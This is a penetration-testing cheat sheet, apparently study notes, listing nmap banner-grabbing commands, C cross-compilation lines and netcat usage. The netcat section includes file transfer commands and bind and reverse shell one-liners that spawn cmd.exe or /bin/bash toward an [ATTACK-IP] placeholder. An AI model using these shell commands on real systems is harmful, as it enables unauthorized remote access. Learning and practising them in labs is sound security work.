## Banner Grabbing

```
nmap -sV
```
```
nmap --script=banner
```
```
nc [IP-ADDRESS] [PORT]
```

* attempt to logon to a service to see welcome banner

***********************************************************************

## nmap scripts

* https://nmap.org/book/nse.html  

```
ls -al /usr/share/nmap/scripts/
```

## Compiling C Code

### For Windows
* x64:
```
i686-w64-mingw32-gcc [C-CODE] -o [OUTFILE]
```
* x86:
```
i686-w64-mingw32-gcc [C-CODE] -o [OUTFILE] -lws2_32
```

### For Linux
```
gcc -pthread [C-CODE] -o [OUTFILE] -lcrypt
```

Pre-Compiled C Code:

***********************************************************************

## Netcat

Connect to port:
```
nc -nv [TARGET-IP] [PORT]
```
*You can use the -u flag to connect to a UDP port*

nc.exe is built into Kali. You can transfer it to a windows machine by any means. It is located at:
```
/usr/share/windows-binaries/
```

Set up Simple HTTP Server via Python:
```
python -m SimpleHTTPServer [PORT]
```

Set up a nc listener:
```
nc -lnvp [PORT]
```
*You can use the -u flag to listen to a UDP port*

Transfer file via Netcat:  
* On receiving machine (THIS MUST BE SET UP FIRST):
```
nc -lnvp [PORT] > [IN-FILE]
```
*[IN-FILE] Does not have to be the same name as [OUT-FILE], which means you can change the name of the file (while keeping contents the same) when transferring the [OUT-FILE] from the sending machine to the receiving machine.*

* On sending machine (THIS MUST BE SET UP SECOND):
```
nc -nv [RECEIVING-IP] [RECEIVING-PORT] < [OUT-FILE]
```

### Bind Shells

*Attacker connects to target*

* use -e [EXECUTABLE] on nc listener (Target) machine

Examples:

Windows:
```
nc.exe -lnvp [PORT] -e cmd.exe
```

Linux:
```
nc -lnvp [PORT] -e /bin/bash
```

### Reverse Shells

*Target connects to attacker*

* use -e [EXECUTABLE] on nc (Target) machine

Examples:

Windows:
```
nc.exe -nv [ATTACK-IP] [PORT] -e cmd.exe
```

Linux:
```
nc -nv [ATTACK-IP] [PORT] -e /bin/bash
```

*Reverse Shells do not have to use netcat. Other options are available*
